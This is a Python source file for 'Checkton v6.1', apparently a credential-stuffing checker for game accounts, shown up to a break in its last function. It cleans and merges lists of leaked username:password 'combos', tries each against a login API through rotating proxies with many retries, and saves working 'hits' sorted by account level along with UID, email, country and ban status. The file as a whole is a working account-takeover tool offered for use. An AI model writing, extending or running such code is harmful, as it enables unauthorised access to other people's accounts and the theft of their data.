import json
import os
import sys
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional
from mt_client import MTClient
from colorama import init, Fore, Style
from pick import pick
import math
import re
import signal
import time
import random
from threading import Lock

# Initialize colorama for Windows color support
init()

proxy_lock = Lock()
proxy_list = []

def process_file_chunk(lines, process_func):
    """Process a chunk of lines with the given function."""
    return [process_func(line) for line in lines if line.strip()]

def process_with_threads(file_path, process_func, thread_count=4):
    """Process a file using multiple threads."""
    try:
        # Read all lines
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        # Remove empty lines and whitespace
        lines = [line.strip() for line in lines if line.strip()]
        
        if not lines:
            print(f"{Fore.RED}No lines to process in the file.{Style.RESET_ALL}")
            return []

        # Calculate chunk size
        chunk_size = max(1, len(lines) // thread_count)
        chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]

        processed_lines = []
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            future_to_chunk = {
                executor.submit(process_file_chunk, chunk, process_func): chunk 
                for chunk in chunks
            }

            for future in as_completed(future_to_chunk):
                try:
                    result = future.result()
                    processed_lines.extend(result)
                except Exception as e:
                    print(f"{Fore.RED}Error processing chunk: {str(e)}{Style.RESET_ALL}")

        return processed_lines

    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
        return []

def remove_duplicates(file_path):
    """Remove duplicate lines from the combo file."""
    try:
        thread_count = get_thread_count()
        
        def process_line(line):
            return line.strip()
        
        lines = process_with_threads(file_path, process_line, thread_count)
        
        # Remove duplicates while preserving order
        unique_lines = list(dict.fromkeys(lines))
        
        # Save to new file in results directory
        results_dir = "results"
        os.makedirs(results_dir, exist_ok=True)
        base_name = os.path.splitext(os.path.basename(file_path))[0]
        output_file = os.path.join(results_dir, f"{base_name}_no_dupes.txt")
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(unique_lines))
        
        print(f"\n{Fore.GREEN}Successfully removed duplicates:{Style.RESET_ALL}")
        print(f"Original count: {len(lines)}")
        print(f"New count: {len(unique_lines)}")
        print(f"Removed: {len(lines) - len(unique_lines)} duplicates")
        print(f"Saved to: {output_file}")
        
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")

def fix_password_format(file_path):
    """Check and fix password format in combo file."""
    try:
        thread_count = get_thread_count()
        
        def process_line(line):
            if not line or ':' not in line:
                return None
                
            email, password = line.split(':', 1)
            
            # Only allow letters and numbers
            allowed_chars = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
            
            # Check if password contains only allowed characters
            if all(c in allowed_chars for c in password):
                # Check if password meets length requirement
                if len(password) >= 6:
                    # Check if password needs uppercase
                    if not any(c.isupper() for c in password):
                        # Capitalize first letter that can be capitalized
                        for i, char in enumerate(password):
                            if char.isalpha():
                                password = password[:i] + char.upper() + password[i+1:]
                                break
                    return f"{email}:{password}"
            return None
        
        processed_lines = process_with_threads(file_path, process_line, thread_count)
        valid_lines = [line for line in processed_lines if line is not None]
        
        # Save processed combos
        results_dir = "results"
        os.makedirs(results_dir, exist_ok=True)
        base_name = os.path.splitext(os.path.basename(file_path))[0]
        output_file = os.path.join(results_dir, f"{base_name}_fixed.txt")
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(valid_lines))
        
        print(f"\n{Fore.GREEN}Successfully processed combos:{Style.RESET_ALL}")
        print(f"Original count: {len(processed_lines)}")
        print(f"Valid combos: {len(valid_lines)}")
        print(f"Invalid/Skipped: {len(processed_lines) - len(valid_lines)}")
        print(f"Saved to: {output_file}")
        
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")

def split_combo_file(file_path):
    """Split combo file into smaller files."""
    try:
        thread_count = get_thread_count()
        
        def process_line(line):
            return line.strip()
        
        lines = process_with_threads(file_path, process_line, thread_count)
        
        if not lines:
            return
            
        while True:
            try:
                lines_per_file = input(f"\n{Fore.CYAN}Enter number of lines per file: {Style.RESET_ALL}")
                lines_per_file = int(lines_per_file)
                if lines_per_file > 0:
                    break
                print(f"{Fore.RED}Please enter a positive number.{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}Please enter a valid number.{Style.RESET_ALL}")
        
        # Calculate number of files needed
        total_files = math.ceil(len(lines) / lines_per_file)
        
        # Create output directory
        results_dir = "results"
        os.makedirs(results_dir, exist_ok=True)
        base_name = os.path.splitext(os.path.basename(file_path))[0]
        
        # Split and save files
        for i in range(total_files):
            start_idx = i * lines_per_file
            end_idx = start_idx + lines_per_file
            chunk = lines[start_idx:end_idx]
            
            output_file = os.path.join(results_dir, f"{base_name}_part{i+1}.txt")
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write('\n'.join(chunk))
        
        print(f"\n{Fore.GREEN}Successfully split file:{Style.RESET_ALL}")
        print(f"Total lines: {len(lines)}")
        print(f"Lines per file: {lines_per_file}")
        print(f"Files created: {total_files}")
        print(f"Files saved in: {results_dir}")
        
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")

def remove_urls(file_path):
    """Remove URLs and domains from combo lines."""
    try:
        thread_count = get_thread_count()
        
        def process_line(line):
            if not line or ':' not in line:
                return None
            
            # Remove common URL patterns and extra colons
            line = re.sub(r'^https?://|www\.|:\d+/|/.*$', '', line)
            parts = line.split(':')
            if len(parts) >= 2:
                return f"{parts[0]}:{parts[1]}"
            return None
        
        processed_lines = process_with_threads(file_path, process_line, thread_count)
        valid_lines = [line for line in processed_lines if line is not None]
        
        # Save processed combos
        results_dir = "results"
        os.makedirs(results_dir, exist_ok=True)
        base_name = os.path.splitext(os.path.basename(file_path))[0]
        output_file = os.path.join(results_dir, f"{base_name}_no_urls.txt")
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(valid_lines))
        
        print(f"\n{Fore.GREEN}Successfully removed URLs:{Style.RESET_ALL}")
        print(f"Original count: {len(processed_lines)}")
        print(f"Valid combos: {len(valid_lines)}")
        print(f"Invalid/Skipped: {len(processed_lines) - len(valid_lines)}")
        print(f"Saved to: {output_file}")
        
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")

def compile_combo_files():
    """Compile multiple combo files into a single file."""
    try:
        thread_count = get_thread_count()
        print(f"\n{Fore.CYAN}Select combo files to compile (Enter 'done' when finished):{Style.RESET_ALL}")
        file_paths = []
        while True:
            file_path = input(f"{Fore.CYAN}Enter path to combo file (or 'done'): {Style.RESET_ALL}").strip()
            if file_path.lower() == 'done':
                if not file_paths:
                    print(f"{Fore.RED}No files selected. Operation cancelled.{Style.RESET_ALL}")
                    return
                break
            if os.path.exists(file_path):
                file_paths.append(file_path)
            else:
                print(f"{Fore.RED}File not found. Please try again.{Style.RESET_ALL}")
        
        # Process all files using threads
        all_lines = set()
        for file_path in file_paths:
            def process_line(line):
                return line.strip()
            
            lines = process_with_threads(file_path, process_line, thread_count)
            all_lines.update(lines)
        
        # Save compiled file
        results_dir = "results"
        os.makedirs(results_dir, exist_ok=True)
        output_file = os.path.join(results_dir, "compiled_combo.txt")
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(sorted(all_lines)))
        
        print(f"\n{Fore.GREEN}Successfully compiled files:{Style.RESET_ALL}")
        print(f"Total unique combos: {len(all_lines)}")
        print(f"Saved to: {output_file}")
        
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")

def combo_editor_menu():
    """Show combo editor menu and handle options."""
    while True:
        clear_screen()
        print_banner()
        title = "Choose a combo editing option:"
        options = [
            "Remove duplicates",
            "Fix password format",
            "Split combo file",
            "Remove URLs",
            "Compile combo files",
            "Back to main menu"
        ]
        
        option, _ = pick(options, title, indicator='→')
        
        if option == "Back to main menu":
            break
            
        if option == "Compile combo files":
            compile_combo_files()
        else:
            file_path = get_combo_file()
            
            if option == "Remove duplicates":
                remove_duplicates(file_path)
            elif option == "Fix password format":
                fix_password_format(file_path)
            elif option == "Split combo file":
                split_combo_file(file_path)
            elif option == "Remove URLs":
                remove_urls(file_path)
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

CONFIG_FILE = "config.json"
DEFAULT_CONFIG = {
    "api_key": "",
    "base_url": "https://mt-hq.onrender.com",
    "save_path": {
        "hits": "results/hits.txt",
        "fails": "results/fails.txt",
        "levels": {
            "below30": "results/levels/below30.txt",
            "30to50": "results/levels/30to50.txt",
            "51to89": "results/levels/51to89.txt",
            "90to100": "results/levels/90to100.txt",
            "above100": "results/levels/above100.txt"
        },
        "banned": "results/banned.txt"
    },
    "move_path": "",  # New field for move destination
    "proxy": {
        "enabled": False,
        "file": "",
        "type": "http",  # Can be http, socks4, or socks5
        "auth": {
            "username": "",
            "password": ""
        }
    }
}

class BanException(Exception):
    pass

class RetryError(Exception):
    pass

def load_config() -> Dict:
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
            # Ensure save_path exists in config
            if "save_path" not in config:
                config["save_path"] = DEFAULT_CONFIG["save_path"]
            return config
    return DEFAULT_CONFIG.copy()

def save_config(config: Dict):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)

def save_result(username: str, password: str, result_type: str, config: Dict, account_info: Optional[Dict] = None, proxy_url: str = "N/A"):
    if not config.get("save_path"):
        return
        
    # Save to main hits/fails file
    save_path = os.path.join(config["save_path"].get(f"{result_type}s", ""))
    if not save_path:
        return
        
    # Create directory if it doesn't exist
    os.makedirs(os.path.dirname(save_path), exist_ok=True)
    
    # Save to main file
    with open(save_path, 'a', encoding='utf-8') as f:
        f.write(f"{username}:{password}\n")
    
    # If it's a hit with account info, also save to level-based files
    if result_type == "hit" and account_info:
        # Check if account is banned
        if account_info.get('is_banned', False):
            banned_path = config["save_path"].get("banned", "")
            if banned_path:
                os.makedirs(os.path.dirname(banned_path), exist_ok=True)
                with open(banned_path, 'a', encoding='utf-8') as f:
                    info_parts = [
                        f"UID: {account_info.get('uid', '')}",
                        f"Name: {account_info.get('name', '')}",
                        f"Rank: {account_info.get('max_rank', '')}",
                        f"Level: {account_info.get('level', '')}",
                        f"Country: {account_info.get('country', '')}",
                        f"Email: {', '.join(filter(None, [account_info.get('bind_email', '')]))}",
                        f"Registered: {account_info.get('registered', '')}",
                        "BANNED",
                        f"Ban Start: {account_info.get('ban_start', '')}",
                        f"Ban End: {account_info.get('ban_end', '')}",
                        f"Reason: {account_info.get('reason', '')}"
                    ]
                    ban_info = f"{username}:{password} (Proxy: {proxy_url}) - {' | '.join(info_parts)}"
                    f.write(f"{ban_info}\n")
        
        if "level" in account_info:
            level = int(account_info.get("level", 0))
            level_paths = config["save_path"].get("levels", {})
            
            # Determine which level file to use
            level_file = None
            if level < 30:
                level_file = level_paths.get("below30")
            elif 30 <= level <= 50:
                level_file = level_paths.get("30to50")
            elif 51 <= level <= 89:
                level_file = level_paths.get("51to89")
            elif 90 <= level <= 100:
                level_file = level_paths.get("90to100")
            else:
                level_file = level_paths.get("above100")
                
            if level_file:
                # Create level directories if they don't exist
                os.makedirs(os.path.dirname(level_file), exist_ok=True)
                # Save to level-specific file
                with open(level_file, 'a', encoding='utf-8') as f:
                    info_str = f" | ".join([
                        f"Level: {level}",
                        f"Name: {account_info.get('name', '')}",
                        f"Country: {account_info.get('country', '')}",
                        f"Rank: {account_info.get('max_rank', '')}",
                        f"UID: {account_info.get('uid', '')}",
                        f"Registered: {account_info.get('registered', '')}"
                    ])
                    f.write(f"{username}:{password} | {info_str}\n")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

class ResultCounter:
    def __init__(self):
        self.hits = 0
        self.fails = 0
        self.retries = 0
        self.bans = 0
        self.invalid = 0
        self.lock = threading.Lock()

    def increment(self, result_type: str):
        with self.lock:
            if result_type == "hit":
                self.hits += 1
            elif result_type == "fail":
                self.fails += 1
            elif result_type == "retry":
                self.retries += 1
            elif result_type == "ban":
                self.bans += 1
            elif result_type == "invalid":
                self.invalid += 1

    def __str__(self):
        return (
            f"{Fore.GREEN}Hits: {self.hits}{Style.RESET_ALL}\n"
            f"{Fore.RED}Fails: {self.fails}{Style.RESET_ALL}\n"
            f"{Fore.YELLOW}Retries: {self.retries}{Style.RESET_ALL}\n"
            f"{Fore.LIGHTRED_EX}Bans: {self.bans}{Style.RESET_ALL}\n"
            f"{Fore.MAGENTA}Invalid: {self.invalid}{Style.RESET_ALL}"
        )

def load_combo_file(file_path: str) -> List[tuple]:
    combos = []
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                username, password = line.split(':', 1)
                combos.append((username.strip(), password.strip()))
    return combos

def check_account(client: MTClient, combo: tuple, counter: ResultCounter, check_info: bool, config: Dict):
    """Check a single account."""
    username, password = combo
    max_retries = 100  # Maximum number of retries with different proxies
    retry_delay = 1  # Delay between retries in seconds
    
    def try_with_new_proxy():
        # Always get a proxy (either from user config or gimmeproxy)
        proxy_data = get_next_proxy(config)
        if not proxy_data:
            return None
        return proxy_data
    
    def format_account_info(account_info: Dict) -> str:
        info_parts = [
            f"UID: {account_info.get('uid', '')}",
            f"Name: {account_info.get('name', '')}",
            f"Rank: {account_info.get('max_rank', '')}",
            f"Level: {account_info.get('level', '')}",
            f"Country: {account_info.get('country', '')}",
            f"Email: {', '.join(filter(None, [account_info.get('bind_email', '')]))}",
            f"Registered: {account_info.get('registered', '')}"
        ]
        
        # Add ban information if account is banned
        if account_info.get('is_banned', False):
            info_parts.extend([
                "BANNED",
                f"Ban Start: {account_info.get('ban_start', '')}",
                f"Ban End: {account_info.get('ban_end', '')}",
                f"Reason: {account_info.get('reason', '')}"
            ])
            
        return " | ".join(info_parts)
    
    def print_result(color: str, status: str, message: str, proxy_url: str):
        proxy_info = f" (Proxy: {proxy_url})"
        print(f"{color}[{status}] {username}:{password}{proxy_info} - {message}{Style.RESET_ALL}")

    def handle_ban(error_msg: str, proxy_url: str):
        counter.increment("ban")
        print_result(Fore.RED, "BAN", error_msg, proxy_url)
        print(f"\n{Fore.RED}{'=' * 30}")
        print(f"SCRIPT STOPPED: BANNED! Reason: {error_msg}")
        print(f"{'=' * 30}{Style.RESET_ALL}")
        os._exit(1)

    # Check password format first before making any API calls
    is_valid, modified_password, error_msg = client._validate_password_format(password)
    if not is_valid:
        counter.increment("invalid")
        print_result(Fore.MAGENTA, "INVALID", error_msg, "N/A")
        save_result(username, password, "fail", config)
        return

    # Use the modified password (auto-capitalized if needed)
    password = modified_password

    for retry_count in range(max_retries):
        proxy_data = try_with_new_proxy()
        if not proxy_data:
            counter.increment("retry")
            time.sleep(retry_delay)
            continue

        try:
            # Prepare request payload with proxy configuration
            payload = {
                "username": username,
                "password": password,
                "proxy": proxy_data
            }

            # For detailed info, use login endpoint directly
            if check_info:
                try:
                    login_response = client.login(**payload)
                except requests.RequestException as e:
                    # Handle timeout and connection errors
                    if retry_count < max_retries - 1:
                        counter.increment("retry")
                        time.sleep(retry_delay)
                        continue
                    counter.increment("fail")
                    print_result(Fore.RED, "FAIL", str(e), proxy_data['url'])
                    save_result(username, password, "fail", config)
                    return
                    
                if not login_response.success:
                    # Check for bans in login route
                    if any(key.lower() in str(login_response.error).lower() for key in [
                        "Rate limit exceeded",
                        "Invalid API key",
                        "Daily Limit Exceeded",
                        "limit_exceeded",
                        "Invalid or inactive API key",
                        "Daily request limit exceeded",
                        "Daily validation limit exceeded"
                    ]):
                        handle_ban(login_response.error, proxy_data['url'])
                    
                    # Check for proxy errors or timeouts
                    if any(key.lower() in str(login_response.error).lower() for key in [
                        "proxy error",
                        "timeout",
                        "connection refused",
                        "connection reset",
                        "no route to host",
                        "Server error",
                        "Internal server error"
                    ]):
                        if retry_count < max_retries - 1:
                            counter.increment("retry")
                            time.sleep(retry_delay)
                            continue
                    
                    counter.increment("fail")
                    print_result(Fore.RED, "FAIL", login_response.error, proxy_data['url'])
                    save_result(username, password, "fail", config)
                    return

                # Check if account is banned and increment ban counter before hit counter
                if login_response.account_info and login_response.account_info.get('is_banned', False):
                    counter.increment("ban")

                counter.increment("hit")
                account_info = format_account_info(login_response.account_info) if login_response.account_info else "Success"
                # Use Fore.LIGHTRED_EX for orange color for banned accounts
                print_result(Fore.LIGHTRED_EX if login_response.account_info and login_response.account_info.get('is_banned', False) else Fore.GREEN, 
                            "HIT", account_info, proxy_data['url'])
                save_result(username, password, "hit", config, login_response.account_info, proxy_data['url'])
                return

            # For basic check, use validate endpoint
            try:
                validate_response = client.validate_account(**payload)
            except requests.RequestException as e:
                # Handle timeout and connection errors
                if retry_count < max_retries - 1:
                    counter.increment("retry")
                    time.sleep(retry_delay)
                    continue
                counter.increment("fail")
                print_result(Fore.RED, "FAIL", str(e), proxy_data['url'])
                save_result(username, password, "fail", config)
                return
                
            if not validate_response.success:
                # Check for rate limits and invalid key in validation
                if any(key.lower() in str(validate_response.error).lower() for key in [
                    "Rate limit exceeded",
                    "Invalid API key",
                    "Daily Limit Exceeded",
                    "limit_exceeded"
                ]):
                    handle_ban(validate_response.error, proxy_data['url'])
                
                # Check for proxy errors or timeouts
                if any(key.lower() in str(validate_response.error).lower() for key in [
                    "proxy error",
                    "timeout",
                    "connection refused",
                    "connection reset",
                    "no route to host",
                    "Server error",
                    "Internal server error",
                    "Invalid parameters",
                    "Failed to validate account credentials",
                    "Invalid response format"
                ]):
                    if retry_count < max_retries - 1:
                        counter.increment("retry")
                        time.sleep(retry_delay)
                        continue
                
                counter.increment("fail")
                print_result(Fore.RED, "FAIL", validate_response.error, proxy_data['url'])
                save_result(username, password, "fail", config)
                return

            # If validation successful, try login with the same proxy
            if check_info:
                try:
                    login_response = client.login(**payload)  # Reuse the same payload with successful proxy
                    if not login_response.success:
                        # Check for bans in login route
                        if any(key.lower() in str(login_response.error).lower() for key in [
                            "Rate limit exceeded",
                            "Invalid API key",
                            "Daily Limit Exceeded",
                            "limit_exceeded",
                            "Invalid or inactive API key",
                            "Daily request limit exceeded",
                            "Daily validation limit exceeded"
                        ]):
                            handle_ban(login_response.error, proxy_data['url'])
                        
                        # If login fails with the successful proxy, mark as fail
                        counter.increment("fail")
                        print_result(Fore.RED, "FAIL", login_response.error, proxy_data['url'])
                        save_result(username, password, "fail", config)
                        return
                    
                    # Check if account is banned and increment ban counter before hit counter
                    if login_response.account_info and login_response.account_info.get('is_banned', False):
                        counter.increment("ban")

                    counter.increment("hit")
                    account_info = format_account_info(login_response.account_info) if login_response.account_info else "Success"
                    # Use Fore.LIGHTRED_EX for orange color for banned accounts
                    print_result(Fore.LIGHTRED_EX if login_response.account_info and login_response.account_info.get('is_banned', False) else Fore.GREEN, 
                                "HIT", account_info, proxy_data['url'])
                    save_result(username, password, "hit", config, login_response.account_info, proxy_data['url'])
                    return
                except Exception as e:
                    # If login fails with the successful proxy, mark as fail
                    counter.increment("fail")
                    print_result(Fore.RED, "ERROR", str(e), proxy_data['url'])
                    save_result(username, password, "fail", config)
                    return
            else:
                counter.increment("hit")
                print_result(Fore.GREEN, "HIT", "Valid credentials", proxy_data['url'])
                save_result(username, password, "hit", config, proxy_url=proxy_data['url'])
                return

        except Exception as e:
            if retry_count < max_retries - 1:
                counter.increment("retry")
                time.sleep(retry_delay)
                continue
            counter.increment("fail")
            print_result(Fore.RED, "ERROR", str(e), proxy_data['url'])
            save_result(username, password, "fail", config)
            return

    # If we've exhausted all retries
    counter.increment("fail")
    print_result(Fore.RED, "FAIL", "Max retries exceeded", "N/A")
    save_result(username, password, "fail", config)

def get_combo_file() -> str:
    title = 'Choose how to select combo file:'
    options = ['Pick from current directory', 'Enter file path manually']
    option, index = pick(options, title, indicator='=>')
    
    if index == 0:  # Pick from directory
        # List all txt files in current directory
        txt_files = [f for f in os.listdir('.') if f.endswith('.txt') and os.path.isfile(f)]
        if not txt_files:
            print(f"{Fore.RED}No .txt files found in current directory!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Switching to manual path input...{Style.RESET_ALL}")
            return get_combo_file()  # Recursively ask again
            
        title = 'Select combo file:'
        option, index = pick(txt_files, title, indicator='=>')
        return option
    else:  # Manual path input
        while True:
            try:
                print(f"{Fore.YELLOW}Tips: You can drag & drop the file into terminal{Style.RESET_ALL}")
                path = input(f"{Fore.CYAN}Enter combo file path (or 'b' to go back): {Style.RESET_ALL}").strip()
                
                if path.lower() == 'b':
                    return get_combo_file()
                
                # Remove quotes if user copied a path with quotes
                path = path.strip('"\'')
                
                if os.path.isfile(path):
                    if path.endswith('.txt'):
                        # Verify file is readable and has content
                        try:
                            with open(path, 'r', encoding='utf-8') as f:
                                first_line = f.readline().strip()
                                if not first_line:
                                    print(f"{Fore.RED}Error: File is empty!{Style.RESET_ALL}")
                                    continue
                                if ':' not in first_line:
                                    print(f"{Fore.RED}Error: Invalid combo format! File must contain username:password format{Style.RESET_ALL}")
                                    continue
                        except Exception as e:
                            print(f"{Fore.RED}Error reading file: {str(e)}{Style.RESET_ALL}")
                            continue
                        return path
                    else:
                        print(f"{Fore.RED}File must be a .txt file!{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}File not found! Please check the path and try again.{Style.RESET_ALL}")
            except KeyboardInterrupt:
                return get_combo_file()
            except Exception as e:
                print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")

def get_thread_count() -> int:
    thread_options = ['1', '5', '10', '15', '20', '25', '30']
    title = 'Select number of threads:'
    option, index = pick(thread_options, title, indicator='=>')
    return int(option)

def get_check_mode() -> bool:
    title = 'Select check mode:'
    options = ['Basic Check (Faster)', 'Detailed Info Check (Slower)']
    option, index = pick(options, title, indicator='=>')
    return index == 1  # Return True if detailed info is selected

def print_banner():
    clear_screen()
    banner = """
 ▄▄· ▄ .▄▄▄▄ . ▄▄· ▄ •▄ ▄▄▄▄▄      ▐ ▄ 
▐█ ▌▪██▪▐█▀▄.▀·▐█ ▌▪█▌▄▌▪•██  ▪     •█▌▐█
██ ▄▄██▀▐█▐▀▀▪▄██ ▄▄▐▀▀▄· ▐█.▪ ▄█▀▄ ▐█▐▐▌
▐███▌██▌▐▀▐█▄▄▌▐███▌▐█.█▌ ▐█▌·▐█▌.▐▌██▐█▌
·▀▀▀ ▀▀▀ · ▀▀▀ ·▀▀▀ ·▀  ▀ ▀▀▀  ▀█▄▀▪▀▀ █▪
    [Checkton v6.1]"""
    print(f"{Fore.CYAN}{banner}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'=' * 30}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Join: t.me/checktonapp{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'=' * 30}{Style.RESET_ALL}")

def view_api_key_info():
    """View information about the current API key."""
    config = load_config()
    if not config.get('api_key'):
        print(f"\n{Fore.RED}No API key configured. Please set an API key first.{Style.RESET_ALL}")
        return

    try:
        import requests
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "X-API-Key": config['api_key']
        }
        
        base_url = config.get('base_url', 'https://mtfastapi.xyz')
        response = requests.get(f"{base_url}/keyinfo", headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success' and 'data' in data:
                info = data['data']
                print(f"\n{Fore.CYAN}API Key Information:{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}{'=' * 50}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}Key:{Style.RESET_ALL} {info.get('key', 'N/A')}")
                print(f"{Fore.GREEN}Name:{Style.RESET_ALL} {info.get('name', 'N/A')}")
                print(f"{Fore.GREEN}Daily Limit:{Style.RESET_ALL} {info.get('daily_limit', 'N/A')}")
                print(f"{Fore.GREEN}Validation Limit:{Style.RESET_ALL} {info.get('validation_limit', 'N/A')}")
                print(f"{Fore.GREEN}Created At:{Style.RESET_ALL} {info.get('created_at', 'N/A')}")
                print(f"{Fore.GREEN}Expires At:{Style.RESET_ALL} {info.get('expires_at', 'N/A')}")
                print(f"{Fore.GREEN}Is Active:{Style.RESET_ALL} {info.get('is_active', 'N/A')}")
                print(f"{Fore.GREEN}Total Requests:{Style.RESET_ALL} {info.get('total_requests', 'N/A')}")
                print(f"{Fore.GREEN}Daily Requests:{Style.RESET_ALL} {info.get('daily_requests', 'N/A')}")
                print(f"{Fore.GREEN}Validation Requests:{Style.RESET_ALL} {info.get('validation_requests', 'N/A')}")
                print(f"{Fore.GREEN}Last Reset:{Style.RESET_ALL} {info.get('last_reset', 'N/A')}")
                print(f"{Fore.YELLOW}{'=' * 50}{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.RED}Error: Invalid response format{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}Error: Failed to fetch API key info (Status code: {response.status_code}){Style.RESET_ALL}")
            
    except Exception as e:
        print(f"\n{Fore.RED}Error fetching API key info: {str(e)}{Style.RESET_ALL}")

def update_api_key():
    """Update the API key in the configuration file."""
    config = load_config()
    print(f"\n{Fore.YELLOW}Current API Key: {config['api_key'] or 'Not set'}{Style.RESET_ALL}")
    new_key = input(f"\n{Fore.CYAN}Enter new API key: {Style.RESET_ALL}").strip()
    
    if new_key:
        config['api_key'] = new_key
        save_config(config)
        print(f"\n{Fore.GREEN}API key updated successfully!{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.RED}API key update cancelled.{Style.RESET_ALL}")

def update_base_url():
    config = load_config()
    current_url = config.get("base_url", "https://mtfastapi.xyz")
    print(f"{Fore.YELLOW}Current base URL: {Style.RESET_ALL}{current_url}")
    new_url = input(f"{Fore.CYAN}Enter new base URL (or press Enter to keep current): {Style.RESET_ALL}").strip()
    if new_url:
        config["base_url"] = new_url
        save_config(config)
        print(f"{Fore.GREEN}Base URL updated successfully!{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}Base URL unchanged.{Style.RESET_ALL}")

def update_save_paths():
    config = load_config()
    save_paths = config.get("save_path", DEFAULT_CONFIG["save_path"])
    
    while True:
        clear_screen()
        print_banner()
        print(f"\n{Fore.CYAN}Current Save Paths:{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}1. Hits: {Style.RESET_ALL}{save_paths['hits']}")
        print(f"{Fore.YELLOW}2. Fails: {Style.RESET_ALL}{save_paths['fails']}")
        print(f"\n{Fore.CYAN}Level-based Paths:{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}3. Below Level 30: {Style.RESET_ALL}{save_paths['levels']['below30']}")
        print(f"{Fore.YELLOW}4. Level 30-50: {Style.RESET_ALL}{save_paths['levels']['30to50']}")
        print(f"{Fore.YELLOW}5. Level 51-89: {Style.RESET_ALL}{save_paths['levels']['51to89']}")
        print(f"{Fore.YELLOW}6. Level 90-100: {Style.RESET_ALL}{save_paths['levels']['90to100']}")
        print(f"{Fore.YELLOW}7. Above Level 100: {Style.RESET_ALL}{save_paths['levels']['above100']}")
        print(f"{Fore.YELLOW}8. Save Changes and Exit{Style.RESET_ALL}")
        
        choice = input(f"\n{Fore.CYAN}Enter number to modify path (1-8): {Style.RESET_ALL}").strip()
        
        if choice == "8":
            config["save_path"] = save_paths
            save_config(config)
            print(f"{Fore.GREEN}Save paths updated successfully!{Style.RESET_ALL}")
            break
        elif choice in ["1", "2"]:
            key = "hits" if choice == "1" else "fails"
            current = save_paths[key]
            print(f"\n{Fore.YELLOW}Current path: {Style.RESET_ALL}{current}")
            new_path = input(f"{Fore.CYAN}Enter new path (or press Enter to keep current): {Style.RESET_ALL}").strip()
            if new_path:
                save_paths[key] = new_path
        elif choice in ["3", "4", "5", "6", "7"]:
            level_keys = {
                "3": "below30",
                "4": "30to50",
                "5": "51to89",
                "6": "90to100",
                "7": "above100"
            }
            key = level_keys[choice]
            current = save_paths["levels"][key]
            print(f"\n{Fore.YELLOW}Current path: {Style.RESET_ALL}{current}")
            new_path = input(f"{Fore.CYAN}Enter new path (or press Enter to keep current): {Style.RESET_ALL}").strip()
            if new_path:
                save_paths["levels"][key] = new_path
        else:
            print(f"{Fore.RED}Invalid choice. Please enter a number between 1 and 8.{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

def move_results():
    """Move result files to a specified location."""
    config = load_config()
    
    if not config.get("move_path"):
        print(f"{Fore.YELLOW}Move path not set. Please set it first.{Style.RESET_ALL}")
        new_path = input(f"{Fore.CYAN}Enter path to move results to: {Style.RESET_ALL}").strip()
        if not new_path:
            print(f"{Fore.RED}Move cancelled.{Style.RESET_ALL}")
            return
        config["move_path"] = new_path
        save_config(config)
    
    save_paths = config.get("save_path", DEFAULT_CONFIG["save_path"])
    move_path = config["move_path"]
    
    # Ensure move destination exists
    try:
        os.makedirs(move_path, exist_ok=True)
    except Exception as e:
        print(f"{Fore.RED}Error creating destination directory: {str(e)}{Style.RESET_ALL}")
        return
    
    moved_count = 0
    files_to_move = [
        save_paths['hits'],
        save_paths['fails'],
        save_paths['levels']['below30'],
        save_paths['levels']['30to50'],
        save_paths['levels']['51to89'],
        save_paths['levels']['90to100'],
        save_paths['levels']['above100'],
        save_paths['banned']
    ]
    
    for file_path in files_to_move:
        if os.path.exists(file_path):
            try:
                # Create the same directory structure in destination
                rel_path = os.path.relpath(file_path, start='results')
                dest_path = os.path.join(move_path, rel_path)
                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                
                # Move the file
                import shutil
                shutil.move(file_path, dest_path)
                moved_count += 1
                print(f"{Fore.GREEN}Moved: {file_path} -> {dest_path}{Style.RESET_ALL}")
